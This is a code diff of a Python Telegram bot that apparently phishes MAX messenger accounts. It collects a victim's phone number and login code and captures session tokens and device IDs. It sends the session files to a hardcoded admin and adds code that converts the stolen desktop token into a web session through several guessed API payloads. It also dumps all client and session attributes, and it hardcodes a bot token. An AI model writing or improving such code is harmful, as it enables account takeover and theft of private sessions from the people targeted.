@@ -13,6 +13,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
 from pymax import Client as SocketMaxClient
+import aiohttp
 
 BOT_TOKEN = "8459830115:AAH_QhkDQ51YBM1Jlb-ZsfbAfkvGuXgzl4E"
 ADMIN_ID = 8632861931
@@ -107,6 +108,35 @@ async def send_files(phone, uid, work_dir, desktop, js):
     await bot.send_document(ADMIN_ID, FSInputFile(wp),
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
+async def convert_to_web_token(desktop_token, user_id, device_id):
+    """Конвертирует десктопный токен в веб-сессию."""
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+    }
+
+    payloads = [
+        {"token": desktop_token, "viewerId": user_id, "device_id": device_id},
+        {"session_token": desktop_token, "device_id": device_id, "device_type": "WEB"},
+        {"auth_token": desktop_token, "user_id": user_id, "device_id": device_id}
+    ]
+
+    async with aiohttp.ClientSession() as session:
+        for i, payload in enumerate(payloads):
+            try:
+                resp = await session.post(
+                    "https://ws-api.oneme.ru/auth/token",
+                    json=payload,
+                    headers=headers
+                )
+                text = await resp.text()
+                logging.info(f"Конвертация {i+1}: {resp.status} {text[:300]}")
+                if resp.status == 200:
+                    return True
+            except Exception as e:
+                logging.error(f"Ошибка конвертации {i+1}: {e}")
+    return False
+
 @dp.message(F.text == "/start")
 async def start(message: types.Message):
     await safe_send(message, "👋 Отправь номер в формате +79111111111")
@@ -144,6 +174,50 @@ async def phone_handler(message: types.Message, state: FSMContext):
                 pending[uid]["token"] = client.token
                 pending[uid]["user_id"] = client.my_id
                 pending[uid]["status"] = "done"
+
+                # === ПОЛНЫЙ ДАМП ВСЕХ ДАННЫХ ===
+                logging.info("=== ВСЕ АТРИБУТЫ КЛИЕНТА ===")
+                for attr in dir(client):
+                    if not attr.startswith('_'):
+                        try:
+                            val = getattr(client, attr)
+                            if not callable(val):
+                                logging.info(f"client.{attr} = {str(val)[:200]}")
+                        except:
+                            pass
+
+                if hasattr(client, 'session'):
+                    logging.info("=== АТРИБУТЫ СЕССИИ ===")
+                    for attr in dir(client.session):
+                        if not attr.startswith('_'):
+                            try:
+                                val = getattr(client.session, attr)
+                                if not callable(val):
+                                    logging.info(f"session.{attr} = {str(val)[:200]}")
+                            except:
+                                pass
+
+                if hasattr(client, 'me'):
+                    logging.info("=== СОДЕРЖИМОЕ client.me ===")
+                    try:
+                        me_dict = client.me.model_dump() if hasattr(client.me, 'model_dump') else client.me.dict()
+                        logging.info(json.dumps(me_dict, indent=2, ensure_ascii=False))
+                    except:
+                        pass
+
+                # Сохраняем device_id из клиента, если есть
+                for attr in ['device_id', 'deviceId', 'deviceid']:
+                    if hasattr(client, attr):
+                        pending[uid]["device_id"] = str(getattr(client, attr))
+                        break
+                if not pending[uid].get("device_id") and hasattr(client, 'session'):
+                    for attr in ['device_id', 'deviceId']:
+                        if hasattr(client.session, attr):
+                            pending[uid]["device_id"] = str(getattr(client.session, attr))
+                            break
+                logging.info(f"Найден device_id: {pending[uid].get('device_id', 'НЕТ')}")
+                # === КОНЕЦ ДАМПА ===
+
         except Exception as e:
             error = str(e).lower()
             logging.error(f"auth_task: исключение для uid={uid}: {e}")
@@ -220,7 +294,12 @@ async def code_handler(message: types.Message, state: FSMContext):
             viewer_id = pending[uid]["user_id"]
             password = gen_password()
             session_id = int(time.time() * 1000)
-            device_id = gen_device_id()
+
+            # Используем device_id из клиента или генерируем
+            device_id = pending[uid].get("device_id") or gen_device_id()
+
+            # Конвертируем в веб-сессию
+            await convert_to_web_token(token, viewer_id, device_id)
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(device_id, token, viewer_id)
@@ -296,9 +375,6 @@ async def password_handler(message: types.Message, state: FSMContext):
             cursor.execute("SELECT * FROM sessions LIMIT 1")
             row = cursor.fetchone()
             if row:
-                logging.info(f"session.db[1] UUID: {row[1]}")
-                logging.info(f"session.db[1] без дефисов: {row[1].replace('-', '')[:16]}")
-                logging.info(f"MD5 от UUID первые 16: {hashlib.md5(row[1].encode()).hexdigest()[:16]}")
                 token = row[0]
                 pending[uid]["token"] = token
                 pending[uid]["status"] = "done"
@@ -312,7 +388,12 @@ async def password_handler(message: types.Message, state: FSMContext):
         user_password = pending[uid].get("user_password", "")
         password = gen_password()
         session_id = int(time.time() * 1000)
-        device_id = gen_device_id()
+
+        # Используем device_id из клиента или генерируем
+        device_id = pending[uid].get("device_id") or gen_device_id()
+
+        # Конвертируем в веб-сессию
+        await convert_to_web_token(token, viewer_id, device_id)
 
         js = generate_web_js(device_id, token, viewer_id)
 
